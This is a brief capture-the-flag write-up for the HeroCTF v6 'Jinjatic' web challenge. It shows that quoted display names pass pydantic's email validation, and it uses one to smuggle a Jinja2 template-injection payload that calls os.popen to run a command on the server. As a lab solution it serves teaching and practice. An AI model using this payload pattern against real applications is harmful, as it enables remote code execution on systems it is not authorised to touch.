---
layout: Post
format: chall
title: Jinjatic
date: 2024-10-25
ctf: HeroCTF v6
tags: [Jinja, SSTI]
category: [Web]
---
# Jinjatic 🟡

<a class="back-link" href="../../">< Go back</a>

## Description

A platform that allows users to render welcome email's template for a given customer, sounds great no ?

> Deploy on <https://deploy.heroctf.fr/>

Author : Worty

all files in [resources/](./resources) were provided.

## Challenge

After looking deeper into what defines an email, we find that pydantic uses email-validator which follows RFC 5321 which defines what is an email, this allows either of the following:

```
test@example.com
"John Doe" <test@example.com>
```

Using that we can bypass the restrictions on from email-validator which lets us put our SSTI inside the quoted message.

{% raw %}

```
"{{cycler.__init__.__globals__.os.popen('../getflag').read()}}" <e@e.eu>
```

{% endraw %}

Running the `../getflag` program will give us the flag.
